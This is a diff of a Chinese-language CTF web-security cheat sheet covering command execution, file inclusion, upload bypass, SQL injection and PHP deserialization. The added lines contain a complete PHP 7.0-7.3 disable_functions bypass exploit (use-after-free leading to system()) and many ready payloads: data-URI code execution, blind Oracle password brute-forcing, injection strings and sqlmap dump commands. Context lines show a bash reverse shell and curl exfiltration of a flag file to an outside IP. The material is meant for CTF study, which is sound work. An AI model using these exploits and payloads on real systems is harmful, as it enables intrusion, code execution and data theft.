+    > - 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，**有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。**
+
+**找个脚本然后上传到一个可以执行命令的目录下，如：`/tmp`**
+
+```nginx
+<?php
+
+# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
+#
+# Bug: https://bugs.php.net/bug.php?id=72530
+#
+# This exploit should work on all PHP 7.0-7.3 versions
+#
+# Author: https://github.com/mm0r1
+
+pwn("/readflag");//改为要执行的命令
+
+function pwn($cmd) {
+    global $abc, $helper;
+
+    function str2ptr(&$str, $p = 0, $s = 8) {
+        $address = 0;
+        for($j = $s-1; $j >= 0; $j--) {
+            $address <<= 8;
+            $address |= ord($str[$p+$j]);
+        }
+        return $address;
+    }
+
+    function ptr2str($ptr, $m = 8) {
+        $out = "";
+        for ($i=0; $i < $m; $i++) {
+            $out .= chr($ptr & 0xff);
+            $ptr >>= 8;
+        }
+        return $out;
+    }
+
+    function write(&$str, $p, $v, $n = 8) {
+        $i = 0;
+        for($i = 0; $i < $n; $i++) {
+            $str[$p + $i] = chr($v & 0xff);
+            $v >>= 8;
+        }
+    }
+
+    function leak($addr, $p = 0, $s = 8) {
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper->a);
+        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
+        return $leak;
+    }
+
+    function parse_elf($base) {
+        $e_type = leak($base, 0x10, 2);
+
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+
+        for($i = 0; $i < $e_phnum; $i++) {
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+
+            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
+                # handle pie
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
+                $text_size = $p_memsz;
+            }
+        }
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    }
+
+    function get_basic_funcs($base, $elf) {
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i < $data_size / 8; $i++) {
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+                $deref = leak($leak);
+                # 'constant' constant check
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            } else continue;
+
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+                $deref = leak($leak);
+                # 'bin2hex' constant check
+                if($deref != 0x786568326e6962)
+                    continue;
+            } else continue;
+
+            return $data_addr + $i * 8;
+        }
+    }
+
+    function get_binary_base($binary_leak) {
+        $base = 0;
+        $start = $binary_leak & 0xfffffffffffff000;
+        for($i = 0; $i < 0x1000; $i++) {
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) { # ELF header
+                return $addr;
+            }
+        }
+    }
+
+    function get_system($basic_funcs) {
+        $addr = $basic_funcs;
+        do {
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+
+            if($f_name == 0x6d6574737973) { # system
+                return leak($addr + 8);
+            }
+            $addr += 0x20;
+        } while($f_entry != 0);
+        return false;
+    }
+
+    class ryat {
+        var $ryat;
+        var $chtg;
+        
+        function __destruct()
+        {
+            $this->chtg = $this->ryat;
+            $this->ryat = 1;
+        }
+    }
+
+    class Helper {
+        public $a, $b, $c, $d;
+    }
+
+    if(stristr(PHP_OS, 'WIN')) {
+        die('This PoC is for *nix systems only.');
+    }
+
+    $n_alloc = 10; # increase this value if you get segfaults
+
+    $contiguous = [];
+    for($i = 0; $i < $n_alloc; $i++)
+        $contiguous[] = str_repeat('A', 79);
+
+    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
+    $out = unserialize($poc);
+    gc_collect_cycles();
+
+    $v = [];
+    $v[0] = ptr2str(0, 79);
+    unset($v);
+    $abc = $out[2][0];
+
+    $helper = new Helper;
+    $helper->b = function ($x) { };
+
+    if(strlen($abc) == 79 || strlen($abc) == 0) {
+        die("UAF failed");
+    }
+
+    # leaks
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+
+    # fake value
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    # fake reference
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj = str2ptr($abc, 0x20);
+
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) {
+        die("Couldn't determine binary base address");
+    }
+
+    if(!($elf = parse_elf($base))) {
+        die("Couldn't parse ELF header");
+    }
+
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
+        die("Couldn't get basic_functions address");
+    }
+
+    if(!($zif_system = get_system($basic_funcs))) {
+        die("Couldn't get zif_system address");
+    }
+
+    # fake closure object
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i < 0x110; $i += 8) {
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    }
+
+    # pwn
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
+    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
+
+    ($helper->b)($cmd);
+
+    exit();
+}
+```
 
 
 
-
-#### ping命令利用
+### ping命令利用
 
 ```nginx
 # 原理，使用;分号切割执行多条命令
@@ -1198,7 +2134,7 @@ mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
 
 
 
-#### 反弹shell
+### 反弹shell
 
 ```nginx
 # 自己的服务器：
@@ -1208,7 +2144,7 @@ nc -lvnp 2333
 bash -i >& /dev/tcp/112.124.52.200/20000 0>&1
 ```
 
-#### curl外带
+### curl外带
 
 ```nginx
 # 将http://ichunqiu.com中的flag文件发送到112.124.52.200:20000
@@ -1221,7 +2157,7 @@ curl 112.112.11.11:6666/`cat /flag`
 
 
 
-#### nginx日志包含
+### nginx日志包含
 
 练习环境：[[HNCTF 2022 WEEK2]easy_include](https://www.nssctf.cn/problem/2948)
 
@@ -1241,36 +2177,182 @@ curl 112.112.11.11:6666/`cat /flag`
 
 
 
-
-### 代码注入
-
-### 文件包含
+## 代码注入
 
 
 
-### 任意文件读取
-
-**可读文件**
-
-```nginx
-/etc/passwd用来判断读取漏洞的存在
-/etc/environment	是环境变量配置文件之一。
-环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。
-/etc/hostname		表示主机名。
-/etc/issue		指明系统版本。
-/proc	目录
-/proc/[pid] 查看进程
-/proc/self 查看当前进程
-/proc/self/cmdline 当前进程对应的终端命令，也就是程序运行路径
-/proc/self/pwd	程序运行目录
-/proc/self/		环境变量
-/sys/class/net/eth0/address mac地址保存位置
-
-```
 
 
+## [文件包含](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
 
-### 文件上传
+### 函数
+
+- reuqire()
+    -  如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。
+- include() 
+    - 如果出错的话，只会提出警告，会继续执行后续语句。
+- require_once() 和 include_once() 功能与require() 和 include() 类似。
+    - 但如果一个文件已经被包含过了，则 require_once() 和 include_once()
+    - 则不会再包含它，以避免函数重定义或变量重赋值等问题。
+
+##### 包含的姿势
+
+- 本地文件包含
+
+- 远程文件包含
+
+    - ```nginx
+        # 条件
+        allow_url_fopen = On
+        allow_url_include = On
+        ```
+
+- 伪协议包含
+
+    - php://input
+
+        - ```nginx
+            # 条件
+            allow_url_fopen = On
+            
+            ?file=php://input
+            POST:
+            <? phpinfo();?>
+            ```
+
+    - php://filter
+
+        - ```nginx
+            ?file=php://filter/read=convert.base64-encode/resource=index.php
+            ?file=php://filter/convert.base64-encode/resource=index.php
+            
+            ```
+
+    - phar://
+
+        - ```nginx
+            # 条件
+            php版本大于等于php5.3.0
+            
+            # 假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包
+            ?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
+            ?file=phar://test.zip/phpinfo.txt
+            
+            ```
+
+    - zip://
+
+        - ```nginx
+            # 条件
+            php版本大于等于php5.3.0
+            但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件
+            
+            ?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt
+            
+            ```
+
+    - data:URI schema
+
+        - ```nginx
+            # 条件
+            php版本大于等于php5.2
+            allow_url_fopen = On
+            allow_url_include = On
+            
+            ?file=data:text/plain,<?php phpinfo();?>
+            ?file=data:text/plain,<?php system('whoami');?>
+            
+            ```
+
+        - ```nginx
+            # 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64
+            # 解码为：<?php phpinfo();?>
+            ?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
+            
+            # 其中PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64
+            # 解码为：<?php system('whoami');?>
+            ```
+
+    - 包含session
+
+        - ```nginx
+            # 条件
+            session文件路径已知，且其中内容部分可控
+            ```
+
+        - ```nginx
+            # 常见的php-session存放位置
+            /var/lib/php/sess_PHPSESSID
+            /var/lib/php/sess_PHPSESSID
+            /tmp/sess_PHPSESSID
+            /tmp/sessions/sess_PHPSESSID
+            
+            # session的文件名格式为sess_[phpsessid]。
+            ```
+
+            
+
+
+
+
+
+## require_once绕过
+
+> 用处：调用时php会检查该文件是否已经被包含过，如果是则不会再次包含
+>
+> - php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，已经include的文件不可以再require_once，那么绕过就是绕过这个哈希表，**做到php认为传入的文件名不在哈希表中，然后又可以让php找到文件进行读取**
+
+**知识点**
+
+- `/proc/self`是指向当前进程的`/proc/pid`
+
+- `/proc/self/root`是指向根目录`/`的链接
+
+- **那么就可以利用这个条件配合多个链接的办法进行绕过**
+
+- ```nginx
+    # 案例
+    <?php
+    error_reporting(E_ALL);
+    require_once('flag.php');
+    highlight_file(__FILE__);
+    if(isset($_GET['content'])) {
+        $content = $_GET['content'];
+        require_once($content);
+    } //题目的代码来自WMCTF2020 make php great again 2.0 绕过require_once是预期解
+    
+    # 传入参数
+    php://filter/convert.base64-encode/resource=
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root
+        /proc/self/root/var/www/html/flag.php
+    
+    ```
+
+    
+
+## 文件上传
+
+###基础
 
 > - 上传文件如果返回结果很快：**客户端检查 否则是服务器端检查**
 > - 在上传一个非图片但后缀为图片的文件：**能够上传检查后缀**，**不能上传内容检查**，或者为其他
@@ -1284,11 +2366,11 @@ curl 112.112.11.11:6666/`cat /flag`
 
 ![img](./assets/1964477-20210910164920104-1455323753.png)
 
-#### 客户端检测绕过
+### 客户端检测绕过
 
 > 上传一个`jpg`或者`png`木马，然后抓包修改文件后缀，将其改为`asp、php、jsp`后缀名即可
 
-#### 服务端后缀黑名单
+### 服务端后缀黑名单
 
 **上传特殊可解析后缀**
 
@@ -1307,7 +2389,7 @@ htm|html|shtml|pwml|js
 vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini
 ```
 
-##### 上传.htaccess
+#### 上传.htaccess
 
  **.htaccess 文件生效前提条件为：**
 
@@ -1316,19 +2398,19 @@ vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini
 
 **介绍**
 
-.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。
+- .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。
 
 **利用**
 
 ```nginx
 <FilesMatch "2xin.png">
 	# **`SetHandler` 可以强制所有匹配的文件被一个指定的处理器处理**
-  # 此时当前目录及其子目录下所有文件都会被当做 php 解析
+  	# 此时当前目录及其子目录下所有文件都会被当做 php 解析
 	SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 
-##### 上传.user.ini
+#### 上传.user.ini
 
 **介绍**
 
@@ -1387,7 +2469,7 @@ CVE-2013-4547(%20%00)
 文件名解析漏洞：test.php.owf.xdx
 ```
 
-##### 利用NTFS ADS特性
+#### 利用NTFS ADS特性
 
 | 上传的文件名                | 服务器表面现象     | 生成的文件内容       |
 | :-------------------------- | :----------------- | :------------------- |
@@ -1397,7 +2479,7 @@ CVE-2013-4547(%20%00)
 | Test.php::$DATA.jpg         | 生成0.jpg          | `<?php phpinfo();?>` |
 | Test.php::$DATA\aaa.jpg     | 生成aaa.jpg        | `<?php phpinfo();?>` |
 
-##### 其他绕过
+#### 其他绕过
 
 - **点绕过、空格绕过、后缀双写绕过、后缀大小写绕过、%00绕过、0x00绕过**
 
@@ -1490,13 +2572,163 @@ session条件竞争题目：[[第五空间 2021\]EasyCleanup](https://www.nssctf
 
 
 
+### 常见绕过手法速览
+
+```nginx
+eval.jpg.php
+双写
+window系统解析：eval.php.
+```
+
 
 
 ------
 
 
 
-### SQL注入
+## SQL注入
+
+
+
+### 基础
+
+```nginx
+# 常用查询信息
+database() # 在用的数据库名
+user()    # 用户信息
+version() # 数据库版本信息
+@@basedir # 数据库安装路径
+@@version_compile_os # 操作系统版本
+
+# ----------字符串截取---------
+substr(flag,1,20)
+mid(flag,1,15);
+```
+
+```nginx
+# 常用的sql注入playload案例
+# ----------表名---------
+/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();#
+
+# ----------库名---------
+/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata
+# ----------字段名---------
+/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema='alien_code'/**/and/**/table_name='code';#
+
+```
+
+#### union创建虚拟表
+
+> union创建的虚拟表的数据是临时的，在下次查询的时候就会发现它不见了，因为它没有实际保存在数据库中
+
+```nginx
+# 通过union关键字生成虚拟的数据
+mysql> select * from users;
++----------+--------------------------------------------------------------+---------+
+| username | password                                                     | enabled |
++----------+--------------------------------------------------------------+---------+
+| nacos    | $2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu |       1 |
++----------+--------------------------------------------------------------+---------+
+1 row in set (0.00 sec)
+
+mysql> select * from users union select 1,2,3;
++----------+--------------------------------------------------------------+---------+
+| username | password                                                     | enabled |
++----------+--------------------------------------------------------------+---------+
+| nacos    | $2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu |       1 |
+| 1        | 2                                                            |       3 |
++----------+--------------------------------------------------------------+---------+
+2 rows in set (0.00 sec)
+```
+
+> 那么就可以利用这个原理，我们可以自定义一列的值信息，如下：我们自己创建一个admin用户并设置它的密码
+>
+> ```nginx
+> mysql> select * from users union select 'admin','123456',3;
+> +----------+--------------------------------------------------------------+---------+
+> | username | password                                                     | enabled |
+> +----------+--------------------------------------------------------------+---------+
+> | nacos    | $2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu |       1 |
+> | admin    | 123456                                                       |       3 |
+> +----------+--------------------------------------------------------------+---------+
+> 2 rows in set (0.00 sec)
+> 
+> mysql> select * from users;
+> +----------+--------------------------------------------------------------+---------+
+> | username | password                                                     | enabled |
+> +----------+--------------------------------------------------------------+---------+
+> | nacos    | $2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu |       1 |
+> +----------+--------------------------------------------------------------+---------+
+> 1 row in set (0.01 sec)
+> ```
+>
+> **可以发现原本`users`表中是没有admin用户的，但是通过这种方法，让这条查询sql语句产生了一个临时的admin用户，并拥有了密码，那么我们就可以通过这种方法绕过登录**
+>
+> ==注意点：一般mysql的用户密码存储方法是加密的，自定义密码的时候记得加密，因为进行登录验证的时候会进行一次解密==
+
+
+
+### 可替换关键字
+
+```nginx
+like 替换 【空格】
+【/**/】 替换 【空格】
+【%a0】 替换 【空格】
+正则
+
+sleep 		可以用benchmark代替
+<,> 		可以用least(),greatest()代替
+=,in 		可以用like代替
+substr 		可以用mid代替
+
+```
+
+### 思路
+
+```nginx
+把【()】过滤掉了可以尝试使用数据覆盖
+存在过滤可以尝试使用大小写、双写绕过
+```
+
+#### 检测注入点
+
+```nginx
+# 字符型测试万能密码
+admin' or '1'='1
+# 测试（这种写法不考虑闭合末尾引号）
+	#【admin' or '1'='1】 	# 页面显示正常
+	#【admin' or '1'='2】   	# 页面显示不正常
+# 结论：存在注入，且为字符型注入，单引号闭合
+
+# 字符型测试万能密码
+admin" or "1"="1
+# 测试（这种写法不考虑闭合末尾引号）
+	#【admin" or "1"="1】 	# 页面显示正常
+	#【admin" or "1"="2】   	# 页面显示不正常
+# 结论：存在注入，且为字符型注入，双引号闭合
+
+# 字符型测试万能密码
+admin') or '1'='1
+# 测试（这种写法不考虑闭合末尾引号）
+	#【admin') or '1'='1】 	# 页面显示正常
+	#【admin') or '1'='2】   	# 页面显示不正常
+# 结论：存在注入，且为字符型注入，单引号+括号闭合
+
+# 字符型测试万能密码
+admin") or "1"="1
+# 测试（这种写法不考虑闭合末尾引号）
+	#【admin") or "1"="1】 	# 页面显示正常
+	#【admin") or "1"="2】   	# 页面显示不正常
+# 结论：存在注入，且为字符型注入，双引号+括号闭合
+
+# 数字型型测试万能密码
+?id=44 or 1=1
+# 测试
+	#【44 or 1=1】 	# 页面显示正常
+	#【44 or 1=2】   # 页面显示不正常
+# 结论：存在注入，且为数字型注入，
+
+```
 
 **特别的**
 
@@ -1509,7 +2741,7 @@ select * from 'admin' where password=md5($pass,true)
 
 
 
-#### sql中可利用的内置函数
+### sql中可利用的内置函数
 
 ```sql
 -- 读取本地文件
@@ -1527,9 +2759,57 @@ handler database open;
 handler database read next
 ```
 
+### 数据库特性
 
+> **判断数据库类型**
+>
+> ```nginx
+> ' || (select '') || '	# （报错就不是MySQL）
+> '||sleep(10)--	# 没有什么延迟就是不是mysql
+> 
+> '||pg_sleep(10)--	# plsql
+>  
+> '||(SELECT '' FROM dual)||'		# (未报错，可能是Oracle数据库）
+> '||(SELECT '' FROM xxxx)||'		# 可以换一个不存在的表，如果报错就是oracle
+> '||(SELECT '' FROM users WHERE ROWNUM = 1)||'	# （rownum=1 防止查询的时候返回多行）
+> # （when的条件成立时，会执行then后的内容，即执行成功1/0报错，若不成立，则返回else后的内容） 
+> '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+> # （用户不存在、1=1不成立有一个为fause时候返回200状态码，否则为ture，执行执行成功1/0报错）
+> '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+> # 判断密码位数
+> '||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+> #  爆破密码
+> '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+> ```
+>
+> 
 
-#### **常用的sql注入playload案例**
+```nginx
+【+】可代替空格
+
+# 不同数据库字符串的连接方法）：
+Oracle: 
+	'foo'||'bar'
+SQL Server: 
+	'foo'+'bar'
+Mysql: 
+	'foo' 'bar'（空格） concat('foo','bar')
+PostgreSQL: 
+    'foo'||'bar'
+    'foo'||'~'||'bar'
+```
+
+> ```nginx
+> # 各数据库查询版本语句）：
+> Mysql        SELECT version()
+> Sql Server   SELECT @@version
+> Oracle       SELECT * FROM v$version
+> Postgre      SELECT version()
+> ```
+>
+> 
+
+### **常用的sql注入playload案例**
 
 ```sql
 # 显示列名
@@ -1567,14 +2847,29 @@ substr(flag,1,20)
 mid(flag,1,15);
 ```
 
-#### 报错注入
+### 报错注入
+
+**如何检测**
+
+```nginx
+# 输入以下内容观察页面是否有报错回显
+输入：单引号
+输入：双引号
+输入：(
+
+# 查询一个不存在的表确认是否存在注入
+1'||(select *from aa)#
+# 结果：'sqlsql.aa' doesn't exist
+```
+
+
 
 ```sql
 admin'^extractvalue(1,concat(0x5c,(select(database()))))%23
 
 ```
 
-##### 单引号报错注入
+#### 单引号报错注入
 
 -   **对数据库中的xml文档故意报错，利用【0x7e = ~ 】这种方式，对后台进行一个排序，指定一个参数为null，让它故意报错，将第二个参数中的语句带入数据库执行，最后报错显示执行结果**
 
@@ -1599,29 +2894,156 @@ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_sc
 and updatexml(1,concat(0x7e,(select 1,group_concat(table_name) from information_schema.columns where table_schema=database() and table_name='')),0)#
 ```
 
+### Quine注入
 
 
-#### sqlmap注入命令
 
-```nginx
-sqlmap -u “注入地址” -v 1 –-dbs # 列举数据库
-sqlmap -u “注入地址” -v 1 –-current-db # 当前数据库
-sqlmap -u “注入地址” -v 1 –-users # 列数据库用户
-sqlmap -u “注入地址” -v 1 -D “数据库” –-tables # 列举数据库的表名
-sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns # 获取表的列名
-sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump # 获取表中的数据
+> 核心：**使输入的sql语句和输出的sql语句一致的方法**
 
+
+
+#### **replace()函数**
+
+-   `replace(object,search,replace)`
+-   把`object`对象中出现的的`search`全部替换成`replace`
+-   **案例**
+
+```sql
+# object  = .
+# search  = char(46)
+# replace = .
+select replace(".",char(46),".");# char(46)就是【.】
++---------------------------+
+| replace(".",char(46),".") |
++---------------------------+
+| .                         |
++---------------------------+
+
+# 将object写成replace(".",char(46),".")
+# object  = replace(".",char(46),".")
+# search  = char(46)
+# replace = .
+select replace('replace(".",char(46),".")',char(46),'.');
++---------------------------+
+| replace(.....) 			|
++---------------------------+
+| replace(".",char(46),".") |
++---------------------------+
+
+# 这时候我们将第三个参数也改成replace(".",char(46),".")
+# object  = replace(".",char(46),".")
+# search  = char(46)
+# replace = replace(".",char(46),".")
+select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
++---------------------------------------------------------------------------+
+| replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")') |
++---------------------------------------------------------------------------+
+| replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")") |
++---------------------------------------------------------------------------+
+# 这时可以发现输出的值和我们查询的东西快变成一样的了，唯一存在的不足就是【单双号的不同】
+# 原来：replace(".",char(46),".") 变成了：replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")")
+```
+
+#### **解决单双引号不同的问题**
+
+```sql
+# char(34) = "      	char(39) = '
+# object  = replace('"."',char(34),char(39)) == 【'.'】
+# search  = char(46)
+# replace = .
+select replace(replace('"."',char(34),char(39)),char(46),".");# 先执行内层replace
++--------------------------------------------------------+
+| replace(replace('"."',char(34),char(39)),char(46),".") |
++--------------------------------------------------------+
+| '.'                                                    |
++--------------------------------------------------------+
+# 这样就可以将我们的双引号替换成单引号，此时我们继续沿用上面的思路，构造输入输出相同的语句
+
+
+# object  = replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)
+# search  = char(46)
+# replace = replace(replace(".",char(34),char(39)),char(46),".")
+select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+  
+     
+至此我们就完成了输入输出完全一致的要求     
+```
+
+#### **Quine基本形式**
+
+```sql
+select replace(replace('str',char(34),char(39)),char(46),'str');
+# 这样去查询就会的得到str字符串本身，不过就是咋这里要多一步，
+# 先将str里的双引号替换成单引号，再用str替换str里的.
+```
+
+**注入的Quine基本形式**
+
+```sql
+1'/**/union/**/select/**/replace(replace('',char(34),char(39)),char(46),'') #
+# 这样去查询就会得到一个空的结果
+'
+select replace(replace('"."',char(34),char(39)),char(46),".");
+# 这条语句用来把双引号替换为单引号
 ```
 
 
 
-### XSS
 
-### SSRF
 
-### SSTI
+### 数据覆盖
 
-#### 基于获取Ip型
+### 二次注入
+
+> **常表现为：登录页面，注册一个新用户，名称为`admin'#`或者`admin"#`，然后登录成功，进入后台进行修改密码，然后达到修改真实admin的密码的目地**
+
+练习题：[[湖湘杯 2021 final]Penetratable](https://www.nssctf.cn/problem/978)
+
+
+
+### sqlmap基本使用
+
+```nginx
+# -v  #详细的等级(0-6) 
+    # 0：只显示Python的回溯，错误和关键消息。 
+    # 1：显示信息和警告消息。 
+    # 2：显示调试消息。 
+    # 3：有效载荷注入。 
+    # 4：显示HTTP请求。 
+    # 5：显示HTTP响应头。 
+    # 6：显示HTTP响应页面的内容 
+sqlmap -u "注入地址" -v 1 –-dbs 		# 列举数据库
+sqlmap -u "注入地址" -v 1 –-current-db 	# 当前数据库
+sqlmap -u "注入地址" -v 1 –-users 		# 列数据库用户
+sqlmap -u "注入地址" -v 1 -D "数据库" –-tables # 列举数据库的表名
+sqlmap -u "注入地址" -v 1 -T "表名" -D "数据库" –-columns # 获取表的列名
+sqlmap -u "注入地址" -v 1 -T "表名" -D "数据库" -C "字段" –-dump # 获取表中的数据
+
+sqlmap -u "注入地址" -v 1 –-form 		# 自动搜索表单
+sqlmap -u "注入地址" -v 1 –-data "id=1&name" 		# post指定参数
+```
+
+#### burp结合使用
+
+> 对burp抓取的请求头信息右键copy to file，然后保存为txt
+>
+> **sqlmap使用命令**
+>
+> ```nginx
+> sqlmap -r '文件位置' -p 参数名 --dbs
+> ```
+>
+> 
+
+## XSS
+
+## SSRF
+
+## SSTI
+
+### 基于获取Ip型
 
 - 出现位置一般在获取本机ip并且有回显的地方
 
@@ -1646,11 +3068,11 @@ sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “�
 
   
 
-### CSRF
+## CSRF
 
-### XXE
+## XXE
 
-### 反序列化
+## 反序列化
 
 > **一些特性**
 >
@@ -1658,7 +3080,7 @@ sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “�
 >
 > 
 
-#### php序列化基础
+### php序列化基础
 
 -   **当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup()函数**
 
@@ -1686,7 +3108,7 @@ __get()						获得一个类的成员变量时调用
 
 
 
-##### **__wakeup**
+#### **__wakeup**
 
 - > 触发条件：**执行unserialize()时，先会调用这个函数**
   >
@@ -1706,7 +3128,7 @@ O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 
 ```
 
-##### **__toString**
+#### **__toString**
 
 > 触发条件：**类被当成字符串时触发**
 
@@ -1718,7 +3140,13 @@ O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 4、声明的变量被赋值了一个对象，然后与strtolower()函数使用会触发
 ```
 
-##### **__get**
+**可以触发的方法**
+
+- strtolower()
+- echo
+- print
+
+#### **__get**
 
 > 触发条件：**访问一个类中的属性不存在或者privte 的时候** 会被触发。
 
@@ -1742,7 +3170,7 @@ echo $example->property;
 
 
 
-##### **__set**
+#### **__set**
 
 ```nginx
 __set($name, $value)						设置一个类的成员变量时调用
@@ -1768,7 +3196,7 @@ $obj->property = "value";
 // 在 __set() 方法内部，我们将属性名和属性值存储到对象的 $data 数组中。
 ```
 
-##### **__invoke**
+#### **__invoke**
 
 > **当一个对象被当函数一样调用的时候** 
 
@@ -1788,7 +3216,7 @@ $obj = new MyClass();
 $obj('Hello World!'); // 将输出： 您传入的参数为： Hello World!
 ```
 
-##### **__call**
+#### **__call**
 
 > 触发条件：调用对象中不存在的方法时调用
 
@@ -1803,7 +3231,7 @@ $obj = new MyClass();
 $obj->undefinedMethod(); // 将输出： 您所调用的方法 undefinedMethod 不存在！
 ```
 
-#### 反射序列化
+### 反射序列化
 
 > 代表题目：2023云演：**[unserialize](https://www.yunyansec.com/#/experiment/expdetail/6)**
 
@@ -1848,7 +3276,7 @@ $reflectionProperty->setValue($flag, 'cat /f*');
 passthru%0a(%27cat%20/flag%27);
 ```
 
-#### phar反序列化
+### phar反序列化
 
 > - 绕过后缀检查：
 >   - **php识别phar文件是通过其文件头的stub，所以可以更改为其他允许通过的后缀**
@@ -1867,7 +3295,7 @@ passthru%0a(%27cat%20/flag%27);
 >     - ```nginx
 >       from hashlib import sha1
 >       import gzip
->                   
+>                                                                   
 >       with open('phar.png', 'rb') as file:
 >           f = file.read()
 >       s = f[:-28]  # 获取要签名的数据
@@ -1925,7 +3353,7 @@ $phar ->addFromString('test.txt','test'); // 要压缩的文件
 
